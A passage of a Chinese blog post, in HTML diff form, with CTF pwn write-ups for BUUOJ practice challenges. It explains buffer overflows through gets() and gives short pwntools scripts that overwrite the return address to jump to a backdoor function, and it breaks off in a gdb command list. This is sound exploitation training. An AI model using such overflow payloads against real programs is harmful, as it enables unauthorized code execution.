@@ -1,0 +1,1532 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Pwn刷题 test_your_nc nc就行，不过有附件可以分析一下\n就是/bin/bash，所以nc上去就是shell\n1 2 3 from pwn import * r = remote(&#34;node5.buuoj.cn&#34;,27726) r.interactive() rip 先checksec\n64位没有栈保护\n">
+<title>Pwn刷题</title>
+
+<link rel='canonical' href='https://0d000721999.github.io/p/pwn%E5%88%B7%E9%A2%98/'>
+
+<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="Pwn刷题">
+<meta property='og:description' content="Pwn刷题 test_your_nc nc就行，不过有附件可以分析一下\n就是/bin/bash，所以nc上去就是shell\n1 2 3 from pwn import * r = remote(&#34;node5.buuoj.cn&#34;,27726) r.interactive() rip 先checksec\n64位没有栈保护\n">
+<meta property='og:url' content='https://0d000721999.github.io/p/pwn%E5%88%B7%E9%A2%98/'>
+<meta property='og:site_name' content='美咕噜的小站'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='刷题' /><meta property='article:tag' content='Pwn' /><meta property='article:published_time' content='2025-12-04T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-12-04T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/pwn%E5%88%B7%E9%A2%98/1.png' />
+<meta name="twitter:title" content="Pwn刷题">
+<meta name="twitter:description" content="Pwn刷题 test_your_nc nc就行，不过有附件可以分析一下\n就是/bin/bash，所以nc上去就是shell\n1 2 3 from pwn import * r = remote(&#34;node5.buuoj.cn&#34;,27726) r.interactive() rip 先checksec\n64位没有栈保护\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://0d000721999.github.io/p/pwn%E5%88%B7%E9%A2%98/1.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "light");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu988272603220494224.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
+            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://buuoj.cn/users/175721'
+                        target="_blank"
+                        title="BUUOJ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
+  <line x1="7" y1="12" x2="13" y2="12" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/0d000721999'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#test_your_nc">test_your_nc</a></li>
+    <li><a href="#rip">rip</a></li>
+    <li><a href="#warmup_csaw_2016">warmup_csaw_2016</a></li>
+    <li><a href="#ciscn_2019_n_1">ciscn_2019_n_1</a></li>
+    <li><a href="#pwn1_sctf_2016">pwn1_sctf_2016</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/pwn%E5%88%B7%E9%A2%98/">
+                <img src="/p/pwn%E5%88%B7%E9%A2%98/1.png"
+                        
+                        width="1280" 
+                        height="1856" 
+                        loading="lazy"
+                        alt="Featured image of post Pwn刷题" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pwn/" style="background-color: #264653; color: #fff;">
+                Pwn
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/pwn%E5%88%B7%E9%A2%98/">Pwn刷题</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Dec 04, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="pwn刷题">Pwn刷题
+</h1><h2 id="test_your_nc">test_your_nc
+</h2><p>nc就行，不过有附件可以分析一下</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20251204214856124.png"
+	width="1920"
+	height="1030"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20251204214856124_hu7963607349751086894.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20251204214856124_hu8713055622137769202.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251204214856124"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
+	
+></p>
+<p>就是/bin/bash，所以nc上去就是shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node5.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">27726</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="rip">rip
+</h2><p>先checksec</p>
+<p>64位没有栈保护</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20251204224705649.png"
+	width="759"
+	height="263"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20251204224705649_hu5412976346480882219.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20251204224705649_hu12566605300912019098.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251204224705649"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="288"
+		data-flex-basis="692px"
+	
+></p>
+<p>main函数里面有gets函数，gets函数不会检查输入字符串的长度，若用户输入的字符串长度超过了 str 所指向数组的大小，就会发生缓冲区溢出。</p>
+<p>gets若没有遇到 \n 结束，则会无限读取，没有上限。
+gets函数这行的意思是它会把我们在“please input”后输入的东西放进&amp;s中（即gets函数的缓冲区）</p>
+<p>双击s</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20251204231032046.png"
+	width="1521"
+	height="700"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20251204231032046_hu5890949109150182327.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20251204231032046_hu7621518298628713080.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251204231032046"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="217"
+		data-flex-basis="521px"
+	
+></p>
+<p>自上往下从第一个函数s到最后一个函数s的地址（都是标蓝的）便是缓冲区大小，可以看到跟前面定义的一样为15</p>
+<p>然后查看字符串shift+F12</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20251204233251543.png"
+	width="930"
+	height="341"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20251204233251543_hu10086748171380220186.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20251204233251543_hu6792077243402210808.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251204233251543"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="272"
+		data-flex-basis="654px"
+	
+></p>
+<p>有system和/bin/bash,双击/bin/bash，要双击左边那个地址</p>
+<p>然后Ctrl+X查看哪里调用了它，直接定位到fun函数</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20251204233650812.png"
+	width="389"
+	height="145"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20251204233650812_hu7298666820396284725.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20251204233650812_hu11306099053306847597.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251204233650812"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="268"
+		data-flex-basis="643px"
+	
+></p>
+<p>现在思路就是利用gets的溢出，返回的地址是fun函数的地址执行fun函数</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20251204234358681.png"
+	width="839"
+	height="640"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20251204234358681_hu10487675723836406964.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20251204234358681_hu9809091155308036753.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251204234358681"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="131"
+		data-flex-basis="314px"
+	
+></p>
+<p>记录fun函数的地址0x401186</p>
+<p>其实在这里直接溢出写exp就行了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node5.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">27884</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">15</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401186</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里记录一下其他解法</p>
+<p><strong>堆栈平衡</strong></p>
+<p>需要找lea的地址或者该函数结束即retn的地址</p>
+<p>可以拖动ida上方蓝条</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20251204235627758.png"
+	width="1920"
+	height="1030"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20251204235627758_hu7083360754998267507.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20251204235627758_hu7280285129117645027.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251204235627758"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
+	
+></p>
+<p>这里可以看到lea地址是0x40118A，retn地址是0x401198，由于这个程序是64位的，所以寄存器rbp大小是8</p>
+<p>所以前面的15+8=23，因为要保持堆栈平衡，说白了就是对齐</p>
+<p>第一种直接后门函数地址+1</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node5.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">27884</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">23</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401186</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里加1的话，实际上就从86跳到87</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20251205003037354.png"
+	width="672"
+	height="222"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20251205003037354_hu4096151421961727684.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20251205003037354_hu5325128678274097351.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251205003037354"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="726px"
+	
+></p>
+<p>直接跳过了push rbp这8个字节，到mov这里，rbp不变，rsp在mov这步才会不变，这样才会使rsp满足16字节对齐</p>
+<p>或者直接跳到8A这里，也会对齐</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node5.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">27884</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">23</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40118A</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="warmup_csaw_2016">warmup_csaw_2016
+</h2><p>首先还是checksec</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260209185919447.png"
+	width="494"
+	height="152"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260209185919447_hu1731628430403278788.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260209185919447_hu8558328228391792989.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260209185919447"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="325"
+		data-flex-basis="780px"
+	
+></p>
+<p>没有canary，说明可以栈溢出，没有NX，栈上代码可以执行，没有PIE,代码段的地址是固定的</p>
+<p>依旧打开ida看一下，反编译main函数看看</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260209190644869.png"
+	width="654"
+	height="250"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260209190644869_hu11882021157072367221.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260209190644869_hu4437480259742347890.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260209190644869"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="261"
+		data-flex-basis="627px"
+	
+></p>
+<p>依旧gets函数，这里sprintf也可能栈溢出，不过这里的换行符<code>\n</code>了，不能栈溢出</p>
+<p>跟上题一样的做法，双击变量v5看看长度</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260209192039957.png"
+	width="604"
+	height="618"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260209192039957_hu128591205701682110.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260209192039957_hu14910586217249942620.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260209192039957"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="97"
+		data-flex-basis="234px"
+	
+></p>
+<p>双击是直接定位到了var_40这里，这里左边0x40就是64，下面返回地址是8，所以溢出到返回地址就是0x40+8，这里也可以动调看偏移量</p>
+<p>然后shift+f12去找后面函数或者别的方法</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260209193553074.png"
+	width="615"
+	height="253"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260209193553074_hu9803390649033375098.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260209193553074_hu15595560154835870051.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260209193553074"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="243"
+		data-flex-basis="583px"
+	
+></p>
+<p>点进去，其实可以右键看调用图，也就是点进去右键Xrefs graph to</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260209193829427.png"
+	width="486"
+	height="434"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260209193829427_hu713199278304403791.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260209193829427_hu15516399974368920220.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260209193829427"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="111"
+		data-flex-basis="268px"
+	
+></p>
+<p>发现是sub_40060D调用了它</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260209194050890.png"
+	width="1304"
+	height="494"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260209194050890_hu6590882308292791881.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260209194050890_hu1453296404019675689.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260209194050890"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="263"
+		data-flex-basis="633px"
+	
+></p>
+<p>头地址是0x40060D,依旧拖动上面看看具体的汇编代码</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260209194542042.png"
+	width="1500"
+	height="252"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260209194542042_hu928451497097650419.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260209194542042_hu16844868206613514481.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260209194542042"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="595"
+		data-flex-basis="1428px"
+	
+></p>
+<p>执行读flag地址是0x400611</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node5.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">28200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400611</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>下面记录一下简单的gdb动调程序的过程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gdb warmup_csaw_2016
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>常用指令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
